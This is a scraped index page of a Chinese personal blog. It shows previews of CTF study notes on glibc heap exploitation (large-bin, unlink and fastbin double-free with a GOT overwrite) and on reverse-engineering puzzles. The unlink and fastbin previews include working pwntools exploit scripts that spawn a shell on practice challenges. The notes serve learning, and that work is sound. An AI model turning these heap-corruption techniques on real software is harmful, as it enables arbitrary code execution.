<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:type" content="website">
<meta property="og:title" content="唐仔橙">
<meta property="og:url" content="https://tangzichengcc.github.io/page/6/index.html">
<meta property="og:site_name" content="唐仔橙">
<meta property="og:description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="唐仔橙">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '唐仔橙',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-01-30 18:28:48'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/" title="pwn入门-19-堆入门之Large_Bin_Attack">pwn入门-19-堆入门之Large_Bin_Attack</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-08T11:47:35.000Z" title="发表于 2023-03-08 19:47:35">2023-03-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-11T14:00:30.717Z" title="更新于 2023-11-11 22:00:30">2023-11-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">2.23 与2.30的分析,, 搭建源码,看源码,  做题
分析漏洞伪造重点,步骤
large bin 的攻击手法,根据libc的版本不同,随着libc版本的更新,加入了很多新的防御手法
https://blog.csdn.net/qq_41202237/article/details/112825556
https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/
https://github.com/shellphish/how2heap
https://blog.csdn.net/A951860555/article/details/115477532
https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20学习/




gdb里查看源代码 list
2.23可以实现任意地址写
分析漏洞利用过程,  同时分析源码,   为什么会这样, 以及分析一下可以怎么样做到利用,然后找例题做一下
下一下libc源码,分析分析 如何进行调试glibc
为啥那个0x90的有四个值???

1先放进large bin 2后放进去,然后再切歌1? fifo
还是说2 1都放进largebin里,然后再切割? largebin是filo?
总的来说,就是要伪造一个chunk,修改bk和bk_nextsize为想要修改的地址(还需要微调,bk的要-0x10,bk_nextsize要-0x20)
2.30后加入了新保护</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/" title="pwn入门-18-堆入门之unlink">pwn入门-18-堆入门之unlink</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-07T08:52:20.000Z" title="发表于 2023-03-07 16:52:20">2023-03-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-02T04:35:19.428Z" title="更新于 2023-12-02 12:35:19">2023-12-02</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">
FD&#x3D;P-&gt;fd &#x3D; target addr -12
BK&#x3D;P-&gt;bk &#x3D; expect value
FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value
BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12

堆块的链接顺序是从大到小还是??
Pwnable
​	gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c
1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123;	struct tagOBJ* fd;	struct tagOBJ* bk;	char buf[8];&#125;OBJ;void shell()&#123;	system(&quot;/bin/sh&quot;);&#125;void unlink(OBJ* P)&#123;	OBJ* BK;	OBJ* FD;	BK=P-&gt;bk;	FD=P-&gt;fd;	FD-&gt;bk=BK;	BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123;	malloc(1024);	OBJ* A = (OBJ*)malloc(sizeof(OBJ));	OBJ* B = (OBJ*)malloc(sizeof(OBJ));	OBJ* C = (OBJ*)malloc(sizeof(OBJ));	// double linked list: A &lt;-&gt; B &lt;-&gt; C	A-&gt;fd = B;	B-&gt;bk = A;	B-&gt;fd = C;	C-&gt;bk = B;	printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);	printf(&quot;here is heap address leak: %p\n&quot;, A);	printf(&quot;now that you have leaks, get shell!\n&quot;);	// heap overflow!	gets(A-&gt;buf);	// exploit this unlink!	unlink(B);	return 0;&#125;



123&quot;A&quot;*16 + (heap_addr+0x20+0x4) + (stack_addr+0x10) + (shell_addr)&quot;A&quot;*16 +  (target addr -12)  + ( expect value:ebp -x04)    + (shell_addr)

​		这个是要把堆中地址
接收到stack地址,修改返回地址?
exp12345678910111213141516171819202122232425262728from pwn import *sh = process(&quot;./unlink&quot;)ELF=ELF(&quot;./unlink&quot;)stack = sh.recvline().strip()heap = sh.recvline().strip()payload = p32(ELF.symbols[&#x27;shell&#x27;]) + b&quot;a&quot;*12	 + p32(heap+0xc) + p32(stack+0x10) sh.send(payload)sh.interactive()from pwn import *#pwn_ssh = ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;unlink&#x27;,password=&#x27;guest&#x27;,port=2222)p = process(&quot;/home/unlink/unlink&quot;)line1=p.readline().strip()line2=p.readline().strip()stack_addr = int(line1.split(&#x27;: 0x&#x27;)[1], 16)heap_addr = int(line2.split(&#x27;: 0x&#x27;)[1], 16)shell_addr = 0x080484ebp.sendline(&#x27;A&#x27;*16 + p32(heap_addr+0x24) + p32(stack_addr+0x10) + p32(shell_addr))p.interactive()

pwnable怎么用exp呢?  写到&#x2F;tmp目录下
https://www.cnblogs.com/dlddw/p/13139172.html
https://etenal.me/archives/972#C30
https://www.cnblogs.com/L0g4n-blog/p/13033301.html
调试源代码1
https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/" title="pwn入门-17-堆入门之fasbinattack">pwn入门-17-堆入门之fasbinattack</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-07T06:54:38.000Z" title="发表于 2023-03-07 14:54:38">2023-03-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-11T13:45:49.838Z" title="更新于 2023-04-11 21:45:49">2023-04-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a></span></div><div class="content">xuanxuan : https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/
Write_Some_Paper申请不同的编号有影响吗????
怎么getshell呢?​		首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了
怎么实现地址写?​		利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力
double free123456789add(0,40,&quot;h&quot;)add(1,40,&quot;h&quot;) delete(0)delete(1)delete(0)  //double free了add(2,40,p64(0x60203a))//这个需要填入覆盖地址了add(3,40,&quot;bbb&quot;)add(3,40,&quot;bbb&quot;)  // 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里add(4,40,&quot;\x40\x00\x00\x00\x00\x00&quot;+p64(ELF.symbols[&#x27;gg&#x27;])) //此时申请的就是第一次add时填入的fd地址		

申请堆块时的地址约束​		即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：

寻找是否有天然满足伪堆块的约束的内存
想办法构造伪堆块

8字节prev_size 随意 , 8字节size(64位下前4字节满足大小,如0x40大小),要覆盖的fd(要修改的内存地址)
要找到覆盖的函数,
123456789pwndbg&gt; x/16gx 0x6020000x602000:	0x0000000000601e28	0x00007ffff7ffe1680x602010:	0x00007ffff7dee0b0	0x00007ffff7a91a700x602020:	0x00007ffff7a7d5d0	0x00007ffff7a7c0e00x602030:	0x0000000000400746	0x00000000004007560x602040:	0x00007ffff7a637b0	0x00007ffff7a2e7400x602050:	0x0000000000400786	0x00007ffff7a493b00x602060:	0x00007ffff7a91550	0x00007ffff7a7ddb00x602070:	0x00007ffff7a79480	0x00000000004007d6

这几个地方都可以作为size

123456789101112130x602000:	0x28	0x1e	0x60	0x00	0x00	0x00	0x00	0x000x602008:	0x68	0xe1	0xff	0xf7	0xff	0x7f	0x00	0x000x602010:	0xb0	0xe0	0xde	0xf7	0xff	0x7f	0x00	0x000x602018 &lt;free@got.plt&gt;:	0x70	0x1a	0xa9	0xf7	0xff	0x7f	0x00	0x000x602020 &lt;puts@got.plt&gt;:	0xd0	0xd5	0xa7	0xf7	0xff	0x7f	0x00	0x000x602028 &lt;fread@got.plt&gt;:	0xe0	0xc0	0xa7	0xf7	0xff	0x7f	0x00	0x000x602030 &lt;__stack_chk_fail@got.plt&gt;:	0x46	0x07	0x40	0x00	0x00	0x00	0x00	0x000x602038 &lt;system@got.plt&gt;:	0x56	0x07	0x40	0x00	0x00	0x00	0x00	0x000x602040 &lt;printf@got.plt&gt;:	0xb0	0x37	0xa6	0xf7	0xff	0x7f	0x00	0x000x602048 &lt;__libc_start_main@got.plt&gt;:	0x40	0xe7	0xa2	0xf7	0xff	0x7f	0x00	0x000x602050 &lt;__gmon_start__@got.plt&gt;:	0x86	0x07	0x40	0x00	0x00	0x00	0x00	0x000x602058 &lt;strtol@got.plt&gt;:	0xb0	0x93	0xa4	0xf7	0xff	0x7f	0x00	0x000x602060 &lt;malloc@got.plt&gt;:	0x50	0x15	0xa9	0xf7

​		根据这个来选择申请的堆块的大小
​		注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可
	
exp123456789101112131415161718192021222324252627282930from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./paper&quot;)elf = ELF(&quot;./paper&quot;)def add(num,length,context):    io.sendlineafter(&quot;delete paper&quot;,&quot;1&quot;)    io.sendlineafter(&quot;(0-9):&quot;,str(num))    io.sendlineafter(&quot;enter&quot;,str(length))    io.sendlineafter(&quot;content&quot;,context)def delete(index):    io.sendlineafter(&quot;delete paper&quot;,&quot;2&quot;)    io.sendlineafter(&quot;(0-9):&quot;,str(index))    add(0,40,&quot;h&quot;)add(1,40,&quot;h&quot;) delete(0)delete(1)delete(0)add(2,40,p64(0x60203a))//这个需要填入覆盖地址了add(3,40,&quot;bbb&quot;)add(3,40,&quot;bbb&quot;)add(4,40,&quot;\x40\x00\x00\x00\x00\x00&quot;+p64(ELF.symbols[&#x27;gg&#x27;]))io.recv(1024)io.sendline(&quot;a&quot;)io.interactive()#io.recv(1024)













</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-2-%E5%88%B7%E9%A2%98/" title="逆向入门-2-刷题">逆向入门-2-刷题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-06T08:13:45.000Z" title="发表于 2023-03-06 16:13:45">2023-03-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-08T07:13:25.824Z" title="更新于 2023-03-08 15:13:25">2023-03-08</time></span></div><div class="content">adworld简单题 1Reversing-x64Elf-100123456789101112131415161718192021222324252627282930313233343536__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  char s[264]; // [rsp+0h] [rbp-110h] BYREF  unsigned __int64 v5; // [rsp+108h] [rbp-8h]  v5 = __readfsqword(0x28u);  printf(&quot;Enter the password: &quot;);  if ( !fgets(s, 255, stdin) )    return 0LL;  if ( (unsigned int)sub_4006FD(s) )  &#123;    puts(&quot;Incorrect password!&quot;);    return 1LL;  &#125;  else  &#123;    puts(&quot;Nice!&quot;);    return 0LL;  &#125;&#125;__int64 __fastcall sub_4006FD(__int64 a1)&#123;  int i; // [rsp+14h] [rbp-24h]  __int64 v3[4]; // [rsp+18h] [rbp-20h]  v3[0] = (__int64)&quot;Dufhbmf&quot;;  v3[1] = (__int64)&quot;pG`imos&quot;;  v3[2] = (__int64)&quot;ewUglpt&quot;;  for ( i = 0; i &lt;= 11; ++i )  &#123;    if ( *(char *)(v3[i % 3] + 2 * (i / 3)) - *(char *)(i + a1) != 1 )      return 1LL;  &#125;  return 0LL;&#125;



*(char *)(v3[i % 3] + 2 * (i &#x2F; 3)) - *(char *)(i + a1) !&#x3D; 1
重点是这一句
123456789101112#include &lt;stdio.h&gt;int main()&#123;char v3[] = &quot;DufhbmfpG`imosewUglpt&quot;;char a;for(int i=0;i&lt;=11;i++)&#123; a =  v3[i%3] + 2*(i/3) - 1-i; printf(&quot;%c&quot;,a);&#125;  return 0;&#125;



理解的不对,这其实是一个二维的,所以说你看到的东西并不是简单的直接反向操作就可以了,还是需要进行加工的
123456789101112#include &lt;stdio.h&gt;int main()&#123;char v3[] = &quot;DufhbmfpG`imosewUglpt&quot;;char a;for(int i=0;i&lt;=12;i++)&#123; a =  v3[i%3][2*(i/3)] - 1-i; printf(&quot;%c&quot;,a);&#125;  return 0;&#125;

注意位数
Code_Talkers
666dd是什么
key为什么是18
izwhroz””w”v.K”.Ni 这个东西逆向
重点是下面这段代码
123456789for ( i = 0; i &lt; key; i += 3 ) &#123;   v3[i + 64] = key ^ (a1[i] + 6);   v3[i + 33] = (a1[i + 1] - 6) ^ key;   v3[i + 2] = a1[i + 2] ^ 6 ^ key;   *(_BYTE *)(a2 + i) = v3[i + 64];   *(_BYTE *)(a2 + i + 1LL) = v3[i + 33];   *(_BYTE *)(a2 + i + 2LL) = v3[i + 2]; &#125;



12345678910int key = 0x12;char a2[50] = &#x27;izwhroz&quot;&quot;w&quot;v.K&quot;.Ni&#x27;;for ( int i = 0; i &lt; 18; i += 3 )  &#123;    a2[i] = 0x12 ^ (flag[i] + 6);    a2[i+1] = (flag[i + 1] - 6) ^ key;    a2[i+2] =  flag[i + 2] ^ 6 ^ key;  &#125;



123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123;int key = 0x12;char a2[50] = &quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;;char flag[50];for ( int i = 0; i &lt; 18; i += 3 )  &#123;     flag[i]= (a2[i]^0x12) - 6 ;     flag[i + 1]=  (a2[i+1]^key) + 6 ;     flag[i + 2] =  a2[i+2]^ 6 ^ key ;  		printf(&quot;%c&quot;,flag[i]);  printf(&quot;%c&quot;,flag[i+1]);  printf(&quot;%c&quot;,flag[i+2]);  &#125;  return 0;&#125;

这里要注意异或和加减的优先级
unctf{b66_6b6_66b}
reverse_re3​		迷宫题,一开始看不懂
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778.data:0000000000202020 dword_202020    dd 5 dup(1), 0Ah dup(0), 5 dup(1), 0, 3, 2 dup(1), 6 dup(0).data:0000000000202020                                         ; DATA XREF: sub_86C+82↑o.data:0000000000202020                                         ; sub_A92+76↑o ....data:0000000000202020                 dd 5 dup(1), 3 dup(0), 1, 6 dup(0), 5 dup(1), 3 dup(0).data:0000000000202020                 dd 1, 6 dup(0), 5 dup(1), 3 dup(0), 5 dup(1), 2 dup(0).data:0000000000202020                 dd 5 dup(1), 7 dup(0), 1, 2 dup(0), 5 dup(1), 7 dup(0).data:0000000000202020                 dd 1, 2 dup(0), 5 dup(1), 7 dup(0), 2 dup(1), 0, 5 dup(1).data:0000000000202020                 dd 8 dup(0), 1, 0, 5 dup(1), 8 dup(0), 4, 0, 4Dh dup(1).data:0000000000202020                 dd 0Dh dup(0), 2 dup(1), 0, 3, 5 dup(1), 6 dup(0), 2 dup(1).data:0000000000202020                 dd 0, 2 dup(1), 3 dup(0), 1, 6 dup(0), 2 dup(1), 6 dup(0).data:0000000000202020                 dd 1, 6 dup(0), 2 dup(1), 0, 2 dup(1), 3 dup(0), 5 dup(1).data:0000000000202020                 dd 2 dup(0), 2 dup(1), 0, 2 dup(1), 7 dup(0), 1, 2 dup(0).data:0000000000202020                 dd 2 dup(1), 0, 2 dup(1), 7 dup(0), 1, 2 dup(0), 2 dup(1).data:0000000000202020                 dd 0, 2 dup(1), 5 dup(0), 4 dup(1), 0, 2 dup(1), 0, 2 dup(1).data:0000000000202020                 dd 5 dup(0), 1, 2 dup(0), 1, 0, 2 dup(1), 0, 2 dup(1).data:0000000000202020                 dd 5 dup(0), 1, 4 dup(0), 2 dup(1), 0, 6 dup(1), 0, 1.data:0000000000202020                 dd 0, 2 dup(1), 0, 2 dup(1), 0, 0Bh dup(1), 0, 2 dup(1).data:0000000000202020                 dd 0Bh dup(0), 4, 0, 1Eh dup(1), 10h dup(0), 3, 2 dup(1).data:0000000000202020                 dd 0Eh dup(0), 1, 0, 3 dup(1), 0Ah dup(0), 3 dup(1), 0.data:0000000000202020                 dd 1, 0Bh dup(0), 1, 2 dup(0), 1, 8 dup(0), 2 dup(1), 0.data:0000000000202020                 dd 1, 2 dup(0), 1, 9 dup(0), 3 dup(1), 2 dup(0), 1, 0Eh dup(0).data:0000000000202020                 dd 1, 0Eh dup(0), 4 dup(1), 0Eh dup(0), 1, 0Eh dup(0).data:0000000000202020                 dd 1, 0Eh dup(0), 1, 0Eh dup(0), 4 dup(1), 0Eh dup(0).data:0000000000202020                 dd 1, 0Eh dup(0), 4, 0.data:0000000000202020 _data           ends    要调整一下格式data:0000000000202020 dword_202020    dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                                         ; DATA XREF: sub_86C+82↑o.data:0000000000202020                                         ; sub_A92+76↑o ....data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1  .data:0000000000202020                 dd 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0.data:0000000000202020                 dd 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0.data:0000000000202020                 dd 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1.data:0000000000202020                 dd 1, 1, 1, 1, 1, 1, 1, 1, 